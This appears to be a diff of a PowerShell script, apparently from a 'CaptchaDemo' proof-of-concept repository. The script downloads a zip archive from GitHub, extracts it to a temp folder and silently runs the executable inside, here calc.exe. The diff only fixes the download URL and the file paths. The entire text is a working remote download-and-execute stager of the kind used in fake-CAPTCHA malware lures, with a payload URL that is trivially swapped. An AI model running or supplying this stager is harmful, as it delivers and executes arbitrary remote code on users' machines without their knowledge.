@@ -1,7 +1,7 @@
 $webClient = New-Object System.Net.WebClient
-$url1 = "https://github.com/DamnIt74/CaptchaDemo/blob/65314d1f4822742fd6cf567f8a87724b9e52fdc2/calc.zip"
-$zipPath1 = "$env:TEMP\pgrt1.zip"
+$url1 = "https://github.com/DamnIt74/CaptchaDemo/raw/refs/heads/main/calc.zip"
+$zipPath1 = "C:\Temp\pgrt1.zip"
 $webClient.DownloadFile($url1, $zipPath1)
-$extractPath1 = "$env:TEMP\file"
+$extractPath1 = "C:\Temp\file"
 Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
-Start-Process -FilePath $env:\TEMP\file\calc.exe
+Start-Process -FilePath "C:\TEMP\file\calc.exe"
